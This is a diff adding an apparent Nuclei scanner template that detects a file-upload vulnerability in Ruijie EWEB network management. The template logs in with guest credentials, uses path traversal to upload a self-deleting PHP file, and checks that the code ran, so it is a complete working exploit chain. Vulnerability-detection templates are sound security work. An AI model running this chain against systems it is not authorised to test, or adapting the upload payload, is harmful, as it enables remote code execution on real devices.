@@ -1,0 +1,73 @@
+id: ruijie-eweb-timeout-fileupload
+
+info:
+  name: 锐捷EWEB文件上传漏洞
+  author: onewin
+  severity: high
+  description: |
+    锐捷EWEB网管系统中的timeout.php文件存在文件上传漏洞，攻击者可以利用该漏洞上传恶意文件并执行。
+  tags: Ruijie-RG-UAC,Ruijie-EWEB网管系统
+
+variables:
+  random_file: '{{rand_text_alphanumeric(10)}}.php'
+  random_content: '{{rand_int(1000000000,9999999999)}}'
+
+flow: |
+  http(1) && http(2) && http(3)
+
+http:
+  - id: get-cookie
+    raw:
+      - |
+        POST /ddi/server/login.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 30
+        Accept-Encoding: gzip, deflate, br
+        Connection: keep-alive
+
+        username=guest&password=guest?
+    extractors:
+      - type: regex
+        name: session_cookie
+        part: header
+        group: 1
+        regex:
+          - "Set-Cookie: (RUIJIEID=[^;]+)"
+        internal: true
+
+  - id: upload-file
+    raw:
+      - |
+        POST /system_pi/timeout.php?a=upload HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: {{session_cookie}}
+        Content-Length: 62
+        Accept: */*
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: keep-alive
+
+        fileName=../tmp/html/{{random_file}}&mes=<?php echo {{random_content}};unlink(__FILE__);?>
+
+  - id: verify-upload
+    raw:
+      - |
+        GET /{{random_file}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
+        Connection: keep-alive
+        Cookie: {{session_cookie}}
+        Accept-Encoding: gzip, deflate, br
+    matchers:
+      - type: word
+        words:
+          - "{{random_content}}"
+        part: body
+      - type: status
+        status:
+          - 200
+    matchers-condition: and
